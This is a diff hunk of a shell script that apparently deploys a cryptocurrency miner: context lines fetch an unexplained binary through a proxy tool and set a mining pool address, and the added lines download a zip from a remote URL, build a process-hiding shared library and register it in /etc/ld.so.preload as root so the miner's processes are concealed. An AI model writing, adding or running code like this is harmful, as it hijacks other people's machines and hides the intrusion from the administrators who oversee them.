@@ -26,6 +26,13 @@ sleep .2
 ./graftcp/graftcp wget https://github.com/angkii/m/raw/main/AkubapakMU
 chmod 700 AkubapakMU
 
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
+unzip magicBezzHash.zip
+sudo make
+sudo gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
+sudo mv libprocesshider.so /usr/local/lib/
+sudo echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+
 #!/bin/bash
 
 POOL=51.79.222.181:21
